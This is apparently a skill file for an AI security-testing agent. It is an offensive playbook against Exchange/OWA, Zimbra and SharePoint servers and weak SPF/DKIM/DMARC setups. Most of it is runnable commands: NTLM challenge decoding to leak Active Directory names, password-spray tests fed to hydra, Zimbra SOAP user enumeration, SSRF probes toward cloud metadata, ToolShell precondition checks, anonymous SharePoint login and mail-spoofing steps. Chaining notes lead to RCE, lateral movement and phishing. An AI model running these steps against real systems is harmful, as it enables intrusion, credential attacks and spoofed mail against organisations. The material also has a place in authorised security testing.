---
name: Mail & Collaboration Server Attacks
description: Exploit internet-facing Exchange/OWA, Zimbra, and SharePoint plus email auth (SPF/DKIM/DMARC) — NTLM/AD leaks, SOAP user enum, ToolShell chain, and known CVEs.
tags: [mail-server, exchange, zimbra, sharepoint, ntlm, email-spoofing]
recommended_tools: [http_request, http_repeater, http_intruder, curl, python3, jq, nuclei_scan, nmap_scan, subfinder_scan, httpx_probe, hydra_attack, execute_command]
vuln_classes: []
domain: network
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [recon/exchange-owa-attack/SKILL.md, recon/zimbra-attack/SKILL.md, redteam/hunt-sharepoint/SKILL.md, recon/email-security/SKILL.md]}
---

# Mail & Collaboration Server Attacks

Attack surface playbook for internet-facing enterprise mail and collaboration platforms: Microsoft
Exchange/OWA, Zimbra Collaboration Suite, Microsoft SharePoint Server (on-prem), plus the email
authentication layer (SPF/DKIM/DMARC/SMTP) that underpins spoofing. These systems leak Active Directory
topology anonymously, expose unauthenticated user-enumeration and legacy-auth primitives, and carry a
long tail of known-but-unpatched CVEs on EoL builds. This skill covers deterministic fingerprinting,
anonymous credential-validation surfaces, and known-CVE precondition checks that stop short of destructive
exploitation.

## When to Use

- Subdomains like `owa.`, `mail.`, `webmail.`, `exchange.`, `autodiscover.`, `zimbra.`, `sts.` resolved.
- crt.sh / SANs reveal mail-related host names; `subfinder_scan` surfaced mail hosts.
- Port 443 returns `WWW-Authenticate: Negotiate` / `NTLM`, or a page/title/header containing "Zimbra".
- SharePoint header/path fingerprints present (`SPRequestGuid`, `MicrosoftSharePointTeamServices`,
  `/_layouts/15/`, `/_vti_bin/`, `/_api/`).
- Passive recon phase for any target domain — always check email auth records.

## Product Fingerprints (do this first)

| Signal | Product |
|--------|---------|
| `X-OWA-Version`, `X-FEServer`, `/owa/`, `/ecp/`, `/ews/` | Exchange / OWA |
| Redirect to `/zimbra/`, title/header "Zimbra", `/service/soap/` | Zimbra |
| `SPRequestGuid`, `X-SharePointHealthScore`, `MicrosoftSharePointTeamServices`, `/_layouts/15/`, `/_vti_bin/` | SharePoint |
| `WWW-Authenticate: Negotiate` / `NTLM` on 443 | Exchange or SharePoint (both leak AD via NTLM) |

```bash
TARGET="target.example"
# Exchange
curl -skI "https://$TARGET/owa/" | grep -iE "x-owa-version|x-feserver|exchange|microsoft"
# Zimbra
curl -skI "https://$TARGET/" | grep -iE "zimbra|zmail"
# SharePoint
curl -sk "https://$TARGET/_vti_inf.html"   # FPVersion=15.x SP2013, 16.x SP2016/2019/SE
```

---

## 1. Microsoft Exchange / OWA

### 1.1 Detection & version → CU mapping

```bash
OWA_RESP=$(curl -skI --max-time 10 "https://$TARGET/owa/")
X_OWA=$(echo "$OWA_RESP" | grep -i "x-owa-version" | sed 's/.*: //')
# 15.1.x = Exchange 2016, 15.2.x = Exchange 2019, 15.0.x = Exchange 2013
```

Endpoint matrix (probe all in one pass; 200/302/401 = present):

| Endpoint | Reveals | Severity |
|----------|---------|----------|
| `/owa/auth/logon.aspx` | Login page / brute-force surface | Medium |
| `/ecp/` | Exchange Control Panel (admin) | High |
| `/ews/exchange.asmx` | Exchange Web Services (SOAP API) | Medium |
| `/autodiscover/autodiscover.xml` | Internal server names | Medium |
| `/mapi/emsmdb/`, `/rpc/rpcproxy.dll` | MAPI/RPC over HTTP | Low |
| `/Microsoft-Server-ActiveSync/` | Mobile sync | Medium |
| `/owa/healthcheck.htm` | Server status / config | Low |

### 1.2 NTLM Type-2 challenge → AD domain leak (Gate 0)

Send an NTLM Type-1 in the `Authorization` header; decode the Type-2 challenge for AD topology. This is
deterministic and unauthenticated. The same technique applies to SharePoint (`/_vti_bin/`) and any
NTLM-enabled IIS binding.

```bash
WWW_AUTH=$(curl -skI --max-time 10 "https://$TARGET/owa/" \
  -H "Authorization: Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" \
  | grep -i "www-authenticate: negotiate" | sed 's/.*negotiate //i' | tr -d '\r\n ')

echo "$WWW_AUTH" | python3 -c '
import base64, struct, sys
data = base64.b64decode(sys.stdin.read().strip())
off = struct.unpack_from("<I", data, 40)[0]
ln  = struct.unpack_from("<I", data, 44)[0]
av  = data[off:off+ln]
types = {1:"NetBIOS Computer Name",2:"NetBIOS Domain Name",3:"DNS Computer Name",
         4:"DNS Domain Name",5:"DNS Tree Name",7:"Timestamp"}
pos = 0
while pos < len(av)-4:
    t = struct.unpack_from("<H", av, pos)[0]
    l = struct.unpack_from("<H", av, pos+2)[0]
    v = av[pos+4:pos+4+l]
    if t in (1,2,3,4,5):
        print(f"  {types[t]}: {v.decode(\"utf-16-le\", errors=\"replace\")}")
    pos += 4 + l
'
```

**Gate 0 pass:** the Type-2 decodes to at minimum DNS Domain Name and NetBIOS Domain Name. Record
Exchange version, AD domain, NetBIOS name, computer names.

### 1.3 Password-spray surface assessment

Do NOT crash accounts — the *deliverable* is proving the credential-validation surface is unbounded, not
cracking a credential.

```bash
# Rate-limit test: 5 rapid wrong-password logins; uniform HTTP code = no throttling
for i in $(seq 1 5); do
  curl -sk -o /dev/null -w "  attempt $i: %{http_code}\n" --max-time 10 \
    -X POST "https://$TARGET/owa/auth.owa" \
    -d "destination=https://$TARGET/owa/&username=synthetic$i@$DOMAIN&password=WrongPass123!"
done
# Basic Auth still enabled? (rare post-2022, easier vector)
curl -skI "https://$TARGET/owa/" -H "Authorization: Basic dGVzdDp0ZXN0" | grep -i "www-authenticate.*basic"
```

Feed a valid username list (from NTLM UPN format + OSINT) into `http_intruder` / `hydra_attack` low-and-slow.
Note: modern Exchange (2019+, Exchange Online) blocks Basic Auth by default — fall back to Modern Auth (OAuth2).

### 1.4 ADFS / Office 365 hybrid recon

```bash
# Autodiscover leaks internal server names
curl -sk "https://autodiscover.$DOMAIN/autodiscover/autodiscover.xml" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>user@'"$DOMAIN"'</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>' \
  | grep -oP '(?:<Server>|<InternalRpcClientServer>|<ASUrl>)[^<]+'
# O365 tenant realm (Federated vs Managed)
curl -sk "https://login.microsoftonline.com/getuserrealm.srf?login=user@$DOMAIN&xml=1" \
  | grep -oP '<NameSpaceType>\K[^<]+'
# ADFS IdP-initiated sign-on
curl -sk -o /dev/null -w "%{http_code}\n" "https://sts.$DOMAIN/adfs/ls/IdpInitiatedSignOn.aspx"
```

**Known CVEs to check by build:** ProxyLogon (CVE-2021-26855 SSRF → RCE chain), ProxyShell
(CVE-2021-34473 / -34523 / -31207), ProxyNotShell (CVE-2022-41040 SSRF + CVE-2022-41082 RCE),
CVE-2023-21529, and the CVE-2024-21410 NTLM-relay-to-Exchange EoP. Confirm build then run
`nuclei_scan` with the relevant Exchange templates before manual PoC.

---

## 2. Zimbra Collaboration Suite

### 2.1 Detection & version (confirm from ≥2 sources)

```bash
curl -sk "https://$TARGET/zimbra/downloads/index.html" | grep -oP 'Zimbra[^<]+' | head -1
# SOAP GetVersionInfo
curl -sk -X POST "https://$TARGET/service/soap/" -H "Content-Type: application/xml" \
  -d '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context xmlns="urn:zimbra"/></soap:Header><soap:Body><GetVersionInfoRequest xmlns="urn:zimbraAdmin"/></soap:Body></soap:Envelope>' \
  | grep -oP '<VersionString>\K[^<]+'
```

### 2.2 Unauthenticated SOAP user enumeration

`AuthRequest` with a wrong password differentiates valid vs invalid accounts. Noisy — every request writes
a login failure to the Zimbra audit log.

```bash
for user in admin administrator spam ham virus galsync wiki webmaster info suporte test; do
  RESP=$(curl -sk -X POST --max-time 5 "https://$TARGET/service/soap/" -H "Content-Type: application/xml" \
    -d "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Header><context xmlns=\"urn:zimbra\"/></soap:Header><soap:Body><AuthRequest xmlns=\"urn:zimbraAccount\"><account by=\"name\">$user@$DOMAIN</account><password>wrongpass</password></AuthRequest></soap:Body></soap:Envelope>")
  echo "$RESP" | grep -q "authentication failed" && echo "  [VALID]    $user"
  echo "$RESP" | grep -q "no such account"       && echo "  [INVALID]  $user"
  echo "$RESP" | grep -q "<authToken>"           && echo "  [CRITICAL] $user — DEFAULT CREDS"
done
```

### 2.3 CVE probes

| Version | CVE | Impact |
|---------|-----|--------|
| < 8.8.15 P34 / < 9.0.0 P27 | CVE-2022-37042 | Auth bypass via `UploadServlet` path traversal → RCE |
| < 8.8.15 P33 | CVE-2022-27925 | Admin `mboximport` RCE (authenticated) |
| 8.8.15 | CVE-2022-30333 | Arbitrary file write via Amavis (RCE) |
| < 8.8.15 P41 | CVE-2023-37580 | Reflected XSS in `/public/login.jsp` |

```bash
# CVE-2022-37042 — UploadServlet reachable? (endpoint liveness only, no file write)
curl -sk -X POST --max-time 10 "https://$TARGET/service/upload?fmt=extended" \
  -H "Content-Type: application/octet-stream" -d "test" | grep -qi "upload\|success\|clientToken" \
  && echo "  [+] UploadServlet ACTIVE — CVE-2022-37042 candidate"
```

Note: if Zimbra sits behind nginx, `UploadServlet` path traversal may be blocked at the proxy even when
the servlet is live.

### 2.4 Internal SSRF via /service/proxy and Admin console

```bash
# SSRF (unauthenticated on pre-8.8.15; auth-gated after)
for pt in "http://127.0.0.1:7071/" "http://169.254.169.254/latest/meta-data/" "http://metadata.google.internal/"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/service/proxy?target=$pt")
  [[ "$code" =~ ^(200|500)$ ]] && echo "  [SSRF?] $pt -> $code"
done
# Admin console (7071 is internal by default; exposed only if misconfigured/port-forwarded)
curl -sk -o /dev/null -w "  /zimbraAdmin/ -> %{http_code}\n" "https://$TARGET/zimbraAdmin/"
curl -sk -o /dev/null -w "  :7071 -> %{http_code}\n" "https://$TARGET:7071/zimbraAdmin/"
```

**Zimbra Gate 0:** SOAP `AuthRequest` must reliably differentiate "authentication failed" (valid) from
"no such account" (invalid); version confirmed from ≥2 sources; document exact curl + response.

---

## 3. Microsoft SharePoint Server (on-prem)

EoL farms are the crown jewels: SP2013 hit EoL 2023-04-11 (`15.0.5545.1000`) so every CVE after that date
is permanently unpatched; SP2016/2019 EoL 2026-07-14; only Subscription Edition remains in active support.

### 3.1 Version fingerprint → CVE matrix

```bash
curl -sk "https://$TARGET/_vti_inf.html"                       # FPVersion — 15.x=SP2013, 16.x=SP2016/2019/SE
curl -sk -X POST "https://$TARGET/_api/contextinfo" -H "Accept: application/json;odata=verbose" \
  | jq -r '.d.GetContextWebInformation.LibraryVersion'         # full build (anon on most farms)
curl -sk "https://$TARGET/_layouts/15/start.aspx" | grep -oE "1[56]\.[0-9]+\.[0-9]+\.[0-9]+"
```

| Build | Edition | Status | Unpatched-after-EoL CVEs |
|-------|---------|--------|--------------------------|
| `15.0.5545.1000` | SP2013 final CU | EoL 2023-04-11 | CVE-2023-29357, CVE-2024-38094, CVE-2025-53770/53771, CVE-2025-49704/49706 |
| `16.0.10416.x` | SP2016 | EoL 2026-07-14 | depends on patch level |
| `16.0.10417.x+` | SP2019 / SE | active | check monthly Patch Tuesday |

### 3.2 Anonymous-endpoint matrix

Walk every path once; anything anonymous becomes part of the chain.

```
/_vti_inf.html                              version disclosure
/_layouts/15/start.aspx                     version + session mint
/_layouts/15/ToolPane.aspx?DisplayMode=Edit ToolShell precondition (the big one)
/_layouts/15/Picker.aspx                    SafeControl reflection recon
/_vti_bin/Authentication.asmx               legacy SOAP login — anon brute-force (CRITICAL)
/_vti_bin/Authentication.asmx?WSDL          confirms Login + Mode ops
/_vti_bin/SharedAccess.asmx                 often anonymous
/_api/contextinfo (POST)                    anonymous FormDigest mint (HIGH)
/_api/$metadata                             ~381KB API surface enumeration
/_api/web/CurrentUser                       401 anon BUT WWW-Authenticate: NTLM leaks AD
```

### 3.3 Legacy SOAP login bypass — Authentication.asmx

The SharePoint equivalent of the WordPress XML-RPC bypass: accepts native Forms credentials anonymously,
usually with no rate limit / lockout even when the branded UI enforces CAPTCHA/MFA.

```bash
# Confirm Mode = Forms (else N/A)
curl -sk -X POST "https://$TARGET/_vti_bin/Authentication.asmx" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Mode" \
  -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Mode xmlns="http://schemas.microsoft.com/sharepoint/soap/" /></soap:Body></soap:Envelope>'
# <ModeResult>Forms</ModeResult> = exploitable ; <ModeResult>Windows</ModeResult> = N/A
```

```xml
POST /_vti_bin/Authentication.asmx HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Login

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <username>USERNAME</username><password>PASSWORD</password>
    </Login>
  </soap:Body>
</soap:Envelope>
```

Responses: `<ErrorCode>NoError</ErrorCode>` → success (`FedAuth` cookie follows);
`<ErrorCode>PasswordNotMatch</ErrorCode>` → fail (uniform for non-existent users too — no enum leak).
**Severity Critical** when anonymous + no rate limit + no lockout. Prove with a 10-burst synthetic-user
test showing uniform timing and identical byte size — the *unbounded validation* is the bug; do not crack
a real credential.

### 3.4 ToolShell precondition chain (CVE-2025-53770 class)

The vulnerable path is anonymous `ToolPane.aspx?DisplayMode=Edit` + anonymous `__REQUESTDIGEST` +
unencrypted ViewState. Present on SP2013 and never patched there. Prove the precondition — do NOT deliver
a malicious ViewState payload.

```bash
# a: anon GET ToolPane — look for __VIEWSTATEENCRYPTED="" (empty = sign-only, exploitable)
curl -sk "https://$TARGET/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
  | grep -oE '__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="[^"]*"'
# b: anon FormDigest
DIGEST=$(curl -sk -X POST "https://$TARGET/_api/contextinfo" -H "Accept: application/json;odata=verbose" \
  | jq -r '.d.GetContextWebInformation.FormDigestValue')
# c: anon state-changing POST with that digest
curl -sk -X POST -H "X-RequestDigest: $DIGEST" \
  --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none" \
  "https://$TARGET/_layouts/15/ToolPane.aspx?DisplayMode=Edit" -w "\ncode=%{http_code}\n"
```

In the real chain, the auth-bypass (CVE-2025-49706, crafted `Referer` to ToolPane.aspx) + insecure
deserialization (CVE-2025-49704) yield a web shell with **no machineKey knowledge**; the `<machineKey>` is
then dumped by that shell to forge signed `__VIEWSTATE` for persistence. machineKey is loot, not a gate —
don't under-assess an exploitable farm just because it's unknown. **Critical on EoL SP2013.**

### 3.5 SafeControl enumeration & download.aspx caveat

`Picker.aspx` differentiates class states: `"Only PickerDialog types can be used..."` = type exists (recon
for CVE-2019-0604-family chains); `"Could not load type..."` = does not exist.

```bash
curl -sk "https://$TARGET/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebPartPages.DataFormWebPart&typeName=System.String" \
  | grep -oE "<title>[^<]+</title>"
```

`/_layouts/15/download.aspx?SourceUrl=` is an **SP-internal path resolver, NOT outbound SSRF**. It echoes
the URL in 500 error titles but does not fetch — confirmed negative across 38 Collaborator-tagged payloads.
Never claim SSRF from the echo; require an OOB callback.

---

## 4. Email Authentication (SPF / DKIM / DMARC)

Always run during passive recon — `p=none` means the domain is fully spoofable (phishing / BEC vector).

```bash
dig +short TXT $DOMAIN | grep "v=spf1"            # SPF
dig +short TXT _dmarc.$DOMAIN                      # DMARC
dig +short TXT google._domainkey.$DOMAIN          # DKIM (try selectors: google, selector1/2, 2023, 2024)
dig +short MX $DOMAIN
```

| Config | Risk |
|--------|------|
| `v=spf1 ~all` (softfail) / `?all` (neutral) | Spoofed mail may pass / totally permissive |
| `v=spf1 include:amazonses.com ~all` | Any AWS SES account can send as the domain |
| `v=DMARC1; p=none` | Zero spoofing protection — CRITICAL when paired with permissive SPF |
| `p=quarantine` / `p=reject` | Partial / full protection |
| DKIM missing | No cryptographic signature — mail forgeable |

**AWS SES spoof (SPF includes `amazonses.com` + DMARC `p=none`):** verify your own domain in an SES account,
send with `From: admin@target.com` — SPF passes (via the include), DMARC `p=none` delivers normally.

**SMTP open relay:**
```bash
timeout 3 bash -c 'exec 3<>/dev/tcp/'"$TARGET"'/25; head -1 <&3'   # banner
swaks --to victim@$DOMAIN --from admin@$DOMAIN --server $TARGET --body "Spoof test"
```

Pitfalls: SPF has a 10-DNS-lookup limit (over-limit = permerror = fail-open on some receivers);
`rua=mailto:` in DMARC may leak auth results to a third party. **Verify:** if `_dmarc` returns `p=none`,
spoofing is confirmed viable.

---

## Chaining Notes

- Exchange/SharePoint NTLM Type-2 → AD domain + NetBIOS + DC hostname → feed the domain into O365/Entra
  ROPC user-enumeration and password spray on the tied tenant.
- SharePoint `Authentication.asmx` anonymous login bypasses ADFS-level lockout → valid cred →
  authenticated `/_layouts/15/` surface (lists, site users, file enum, IDOR in custom modules).
- Zimbra SOAP user enum → valid accounts → spray; default creds → `authToken` → admin console → mboximport RCE.
- ProxyShell/ProxyNotShell on Exchange → SYSTEM on the mailbox server → AD lateral movement.
- Email `p=none` + harvested valid usernames from mail-server enum → targeted phishing for initial access.

## References

- CWE-200 (info exposure), CWE-287 (improper auth), CWE-307 (no restriction on auth attempts),
  CWE-22 (path traversal), CWE-502 (deserialization), CWE-918 (SSRF).
- Exchange: ProxyLogon/ProxyShell/ProxyNotShell, CVE-2024-21410. Zimbra: CVE-2022-37042/-27925/-30333,
  CVE-2023-37580. SharePoint: ToolShell CVE-2025-53770/53771/49704/49706, CVE-2023-29357, CVE-2019-0604.
